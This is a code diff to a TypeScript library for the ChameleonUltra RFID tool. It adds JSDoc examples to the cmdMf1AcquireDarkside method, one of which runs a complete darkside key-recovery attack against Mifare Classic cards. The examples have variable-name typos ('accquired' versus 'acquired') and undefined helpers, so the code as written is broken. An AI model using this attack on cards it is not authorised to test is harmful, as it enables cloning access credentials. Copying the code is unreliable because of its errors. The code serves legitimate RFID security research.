@@ -1355,9 +1355,62 @@ export class ChameleonUltra {
    * @param syncMax The max sync count of darkside attack.
    * @returns The data from mifare darkside attack.
    * @group Mifare Classic Related
-   * @alpha
+   * @example
+   * ```js
+   * const { DeviceMode, Mf1KeyType, DarksideStatus } = window.ChameleonUltraJS
+   *
+   * async function run (ultra) {
+   *   await ultra.cmdChangeDeviceMode(DeviceMode.READER)
+   *   const res1 = await ultra.cmdMf1AcquireDarkside(0, Mf1KeyType.KEY_A, true)
+   *   console.log(res1)
+   *   const res2 = {
+   *     ar: res1.ar.toString('hex'),
+   *     ks: res1.ks.toString('hex'),
+   *     nr: res1.nr.toString('hex'),
+   *     nt: res1.nt.toString('hex'),
+   *     par: res1.par.toString('hex'),
+   *     status: `${DarksideStatus[res1.status]} (${res1.status})`,
+   *     uid: res1.uid.toString('hex'),
+   *   }
+   *   console.log(res2)
+   *   // {
+   *   //   "ar": "00000000",
+   *   //   "ks": "0c0508080f04050a",
+   *   //   "nr": "00000000",
+   *   //   "nt": "b346fc3d",
+   *   //   "par": "0000000000000000",
+   *   //   "status": "OK (0)",
+   *   //   "uid": "d3efed0c"
+   *   // }
+   * }
+   * ```
+   *
+   * If you want to use darkside attack to recover the key, you can use the following example code:
+   *
+   * ```js
+   * const { Buffer, DarksideStatus, DeviceMode, Mf1KeyType } = window.ChameleonUltraJS
+   *
+   * async function run (ultra) {
+   *   await ultra.cmdChangeDeviceMode(DeviceMode.READER)
+   *   const block = 0
+   *   const keyType = Mf1KeyType.KEY_A
+   *   const key = await Crypto1.darkside(
+   *     async attempt => {
+   *       const accquired = await ultra.cmdMf1AcquireDarkside(block, keyType, attempt === 0)
+   *       console.log(_.mapValues(accquired, buf => Buffer.isBuffer(buf) ? buf.toString('hex') : buf))
+   *       if (acquired.status === DarksideStatus.LUCKY_AUTH_OK) throw new Error('LUCKY_AUTH_OK')
+   *       if (acquired.status !== DarksideStatus.OK) throw new Error('card is not vulnerable to Darkside attack')
+   *       return accquired
+   *     },
+   *     async key => {
+   *       return await ultra.cmdMf1CheckBlockKey({ block, keyType, key })
+   *     },
+   *   )
+   *   console.log(`key founded: ${key.toString('hex')}`)
+   * }
+   * ```
    */
-  async cmdMf1AcquireDarkside (block = 0, keyType = Mf1KeyType.KEY_A, isFirst = false, syncMax: number = 15): Promise<Decoder.Mf1DarksideRes> {
+  async cmdMf1AcquireDarkside (block: number, keyType: Mf1KeyType, isFirst: boolean, syncMax: number = 30): Promise<Decoder.Mf1DarksideRes> {
     if (!isMf1KeyType(keyType)) throw new TypeError('Invalid keyType')
     this._clearRxBufs()
     const cmd = Cmd.MF1_DARKSIDE_ACQUIRE // cmd = 2004
